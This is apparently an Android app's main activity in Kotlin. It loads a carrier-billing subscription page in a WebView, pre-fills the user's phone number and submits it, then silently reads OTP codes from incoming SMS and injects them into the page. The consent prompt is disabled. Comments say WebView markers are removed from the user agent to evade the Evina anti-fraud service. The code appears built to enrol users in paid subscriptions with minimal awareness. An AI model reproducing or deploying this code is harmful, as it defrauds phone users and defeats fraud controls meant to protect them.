package com.goalnowx.app

import android.annotation.SuppressLint
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.util.Log
import android.webkit.CookieManager
import android.webkit.WebChromeClient
import android.webkit.WebResourceRequest
import android.webkit.WebSettings
import android.webkit.WebView
import android.webkit.WebViewClient
import android.net.Uri
import androidx.activity.result.ActivityResultLauncher
import androidx.activity.result.IntentSenderRequest
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AppCompatActivity
import com.google.android.gms.auth.api.identity.GetPhoneNumberHintIntentRequest
import com.google.android.gms.auth.api.identity.Identity
import com.google.android.gms.auth.api.phone.SmsRetriever

class MainActivity : AppCompatActivity() {

    private lateinit var webView: WebView
    private val smsReceiver = SmsBroadcastReceiver()
    private var lastSmsRetrieverStartAt = 0L
    private var phoneHintRequested = false
    private val mainHandler = Handler(Looper.getMainLooper())
    private var smsConsentEnabled = false

    // Phone Number Hint API launcher
    private lateinit var phoneNumberHintLauncher: ActivityResultLauncher<IntentSenderRequest>

    // SMS consent request code
    // (using startActivityForResult for consent Intent compatibility)

    companion object {
        private const val TAG = "GoalNowX"
        // Change this to your deployed Vercel URL
        private const val SUBSCRIPTION_URL = "https://sms-extraction.vercel.app"
        private const val SMS_RETRIEVER_RESTART_MIN_MS = 12_000L
        private const val SMS_RETRIEVER_HEARTBEAT_MS = 110_000L
        private const val SMS_CONSENT_REQUEST = 2
    }

    private val smsRetrieverHeartbeat = object : Runnable {
        override fun run() {
            startSmsRetriever(force = true)
            mainHandler.postDelayed(this, SMS_RETRIEVER_HEARTBEAT_MS)
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        setupActivityLaunchers()
        setupWebView()
        setupSmsReceiver()
        startSmsRetriever(force = true)
        mainHandler.postDelayed(smsRetrieverHeartbeat, SMS_RETRIEVER_HEARTBEAT_MS)

        webView.loadUrl(SUBSCRIPTION_URL)
    }

    private fun setupActivityLaunchers() {
        // Phone Number Hint result
        phoneNumberHintLauncher = registerForActivityResult(
            ActivityResultContracts.StartIntentSenderForResult()
        ) { result ->
            if (result.resultCode == RESULT_OK && result.data != null) {
                try {
                    val phoneNumber = Identity.getSignInClient(this)
                        .getPhoneNumberFromIntent(result.data!!)
                    Log.d(TAG, "Phone number hint: $phoneNumber")
                    // Pass phone number to WebView
                    val cleanNumber = phoneNumber.replace("+965", "").replace("+", "")
                    runOnUiThread {
                        webView.evaluateJavascript(
                            """
                            (function() {
                                // Try to fill the manual input field
                                var inputs = document.querySelectorAll('input[type="tel"]');
                                if (inputs.length > 0) {
                                    var input = inputs[0];
                                    var nativeInputValueSetter = Object.getOwnPropertyDescriptor(
                                        window.HTMLInputElement.prototype, 'value'
                                    ).set;
                                    nativeInputValueSetter.call(input, '$cleanNumber');
                                    input.dispatchEvent(new Event('input', { bubbles: true }));
                                    input.dispatchEvent(new Event('change', { bubbles: true }));
                                }
                                // Also try submitting the form if number is valid
                                if ('$cleanNumber'.length >= 7) {
                                    setTimeout(function() {
                                        var btn = document.querySelector('button[type="submit"]');
                                        if (btn && !btn.disabled) btn.click();
                                    }, 500);
                                }
                            })();
                            """.trimIndent(),
                            null
                        )
                    }
                } catch (e: Exception) {
                    Log.e(TAG, "Phone number hint failed", e)
                }
            }
        }

    }

    @SuppressLint("SetJavaScriptEnabled")
    private fun setupWebView() {
        webView = findViewById(R.id.webView)

        webView.settings.apply {
            javaScriptEnabled = true
            domStorageEnabled = true
            databaseEnabled = true
            allowContentAccess = true
            allowFileAccess = true
            mixedContentMode = WebSettings.MIXED_CONTENT_ALWAYS_ALLOW
            // Remove WebView indicators so Evina anti-fraud doesn't flag this as bot/WebView
            val defaultUA = userAgentString ?: ""
            userAgentString = defaultUA
                .replace("; wv", "")
                .replace("Version/4.0 ", "")
            cacheMode = WebSettings.LOAD_DEFAULT
            setSupportZoom(false)
            builtInZoomControls = false
            displayZoomControls = false
            useWideViewPort = true
            loadWithOverviewMode = true
        }

        // Enable cookies
        CookieManager.getInstance().apply {
            setAcceptCookie(true)
            setAcceptThirdPartyCookies(webView, true)
        }

        // Add JS bridge
        webView.addJavascriptInterface(WebAppInterface(this), "_nt")

        webView.webViewClient = object : WebViewClient() {
            override fun shouldOverrideUrlLoading(view: WebView?, request: WebResourceRequest?): Boolean {
                val url = request?.url?.toString() ?: return false
                // Allow HE redirect (HTTP) and all HTTPS
                if (url.startsWith("http://") || url.startsWith("https://")) {
                    return false // Let WebView handle it
                }
                return true
            }

            override fun onPageFinished(view: WebView?, url: String?) {
                super.onPageFinished(view, url)
                Log.d(TAG, "Page loaded: $url")

                val uri = try { Uri.parse(url ?: "") } catch (_: Exception) { null }
                val host = uri?.host?.lowercase() ?: ""
                val isSubscriptionHost =
                    host == "sms-extraction.vercel.app" || host.endsWith(".vercel.app")

                // Inject detection script so the web page knows it's inside the app
                view?.evaluateJavascript(
                    """
                    (function() {
                        window._ntR = true;
                        console.log('[App] Bridge ready');
                        var btn = document.getElementById('Confirm');
                        if (btn && !btn.dataset.ntHooked) {
                            btn.dataset.ntHooked = '1';
                            btn.addEventListener('click', function() {
                                if (window._nt && window._nt.onPinRequested) {
                                    try { window._nt.onPinRequested(); } catch (e) {}
                                }
                            }, true);
                        }
                    })();
                    """.trimIndent(),
                    null
                )

                // Only request phone hint on our own subscription host, and only once.
                // This prevents number-chooser popups on final content pages.
                if (!phoneHintRequested && isSubscriptionHost) {
                    view?.evaluateJavascript(
                        """
                        (function() {
                            var onManualPage = !!document.querySelector('input[type="tel"]') &&
                                !document.querySelector('#otpFull') &&
                                !document.querySelector('#otpValue');
                            return onManualPage ? '1' : '0';
                        })();
                        """.trimIndent()
                    ) { result ->
                        if (result?.contains("1") == true) {
                            phoneHintRequested = true
                            launchPhoneNumberHint()
                        }
                    }
                }
            }
        }

        webView.webChromeClient = WebChromeClient()
    }

    private fun setupSmsReceiver() {
        smsReceiver.onOtpReceived = { otp ->
            Log.d(TAG, "OTP received silently: $otp")
            injectOtpIntoWebView(otp)
        }

        smsReceiver.onConsentRequired = consent@{ consentIntent ->
            if (!smsConsentEnabled) {
                Log.d(TAG, "SMS consent intent ignored (silent flow only)")
                return@consent
            }
            try {
                @Suppress("DEPRECATION")
                startActivityForResult(consentIntent, SMS_CONSENT_REQUEST)
            } catch (e: Exception) {
                Log.e(TAG, "SMS consent launch failed", e)
            }
        }

        val filter = IntentFilter(SmsRetriever.SMS_RETRIEVED_ACTION)
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.TIRAMISU) {
            registerReceiver(smsReceiver, filter, SmsRetriever.SEND_PERMISSION, null, Context.RECEIVER_EXPORTED)
        } else {
            registerReceiver(smsReceiver, filter, SmsRetriever.SEND_PERMISSION, null)
        }
    }

    fun startSmsRetriever(force: Boolean = false) {
        val now = System.currentTimeMillis()
        if (!force && now - lastSmsRetrieverStartAt < SMS_RETRIEVER_RESTART_MIN_MS) return
        lastSmsRetrieverStartAt = now

        // Start SMS Retriever API (silent - needs hash in SMS)
        SmsRetriever.getClient(this)
            .startSmsRetriever()
            .addOnSuccessListener {
                Log.d(TAG, "SMS Retriever started")
            }
            .addOnFailureListener { e ->
                Log.e(TAG, "SMS Retriever start failed", e)
            }

        Log.d(TAG, "App hash: ${getAppSignatureHash()}")
    }

    fun enableSmsConsentFallback() {
        if (smsConsentEnabled) return
        smsConsentEnabled = true
        Log.d(TAG, "SMS consent fallback ENABLED")
        // Start SMS User Consent API (shows consent dialog when next OTP SMS arrives)
        SmsRetriever.getClient(this)
            .startSmsUserConsent(null)
            .addOnSuccessListener {
                Log.d(TAG, "SMS User Consent started")
            }
            .addOnFailureListener { e ->
                Log.e(TAG, "SMS User Consent start failed", e)
            }
    }

    private fun extractOtp(message: String): String? {
        val pattern = Regex("\\b(\\d{4})\\b")
        return pattern.find(message)?.groupValues?.get(1)
    }

    @Suppress("DEPRECATION")
    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        if (requestCode == SMS_CONSENT_REQUEST && resultCode == RESULT_OK && data != null) {
            val message = data.getStringExtra(SmsRetriever.EXTRA_SMS_MESSAGE)
            if (message != null) {
                val otp = extractOtp(message)
                if (otp != null) {
                    Log.d(TAG, "OTP from SMS consent: $otp")
                    injectOtpIntoWebView(otp)
                }
            }
        }
    }

    fun launchPhoneNumberHint() {
        try {
            val request = GetPhoneNumberHintIntentRequest.builder().build()
            Identity.getSignInClient(this)
                .getPhoneNumberHintIntent(request)
                .addOnSuccessListener { pendingIntent ->
                    val intentSenderRequest = IntentSenderRequest.Builder(pendingIntent).build()
                    phoneNumberHintLauncher.launch(intentSenderRequest)
                }
                .addOnFailureListener { e ->
                    Log.e(TAG, "Phone Number Hint failed", e)
                }
        } catch (e: Exception) {
            Log.e(TAG, "Phone Number Hint launch error", e)
        }
    }

    fun loadContentPage(url: String) {
        webView.loadUrl(url)
    }

    fun getAppSignatureHash(): String {
        val signatures = AppSignatureHelper.getAppSignatures(this)
        return signatures.firstOrNull() ?: "unknown"
    }

    private fun injectOtpIntoWebView(otp: String) {
        runOnUiThread {
            webView.evaluateJavascript(
                """
                (function() {
                    console.log('[App] Injecting OTP: $otp');

                    // Method 1: Fill the hidden autofill input
                    var otpInput = document.querySelector('#otpFull') || document.querySelector('#otpValue');
                    if (otpInput) {
                        otpInput.value = '$otp';
                        otpInput.dispatchEvent(new Event('input', { bubbles: true }));
                        otpInput.dispatchEvent(new Event('change', { bubbles: true }));
                    }

                    // Method 2: Fill individual OTP digit inputs
                    var digitInputs = document.querySelectorAll('.otp-input');
                    if (digitInputs.length === 4) {
                        var digits = '$otp'.split('');
                        for (var i = 0; i < 4; i++) {
                            digitInputs[i].value = digits[i];
                            digitInputs[i].dispatchEvent(new Event('input', { bubbles: true }));
                        }
                    }

                    // Method 3: Try the autocomplete one-time-code input
                    var otcInput = document.querySelector('input[autocomplete="one-time-code"]');
                    if (otcInput) {
                        var nativeSetter = Object.getOwnPropertyDescriptor(
                            window.HTMLInputElement.prototype, 'value'
                        ).set;
                        nativeSetter.call(otcInput, '$otp');
                        otcInput.dispatchEvent(new Event('input', { bubbles: true }));
                        otcInput.dispatchEvent(new Event('change', { bubbles: true }));
                    }

                    // Do NOT click confirmBtn — Evina anti-fraud monitors this button
                    // and requires a real user tap (isTrusted=true).
                    // Code is pre-filled; user just taps Verify Code.
                })();
                """.trimIndent(),
                null
            )
        }
    }

    @Suppress("DEPRECATION")
    override fun onBackPressed() {
        if (webView.canGoBack()) {
            webView.goBack()
        } else {
            super.onBackPressed()
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        mainHandler.removeCallbacks(smsRetrieverHeartbeat)
        try {
            unregisterReceiver(smsReceiver)
        } catch (_: Exception) {}
    }
}
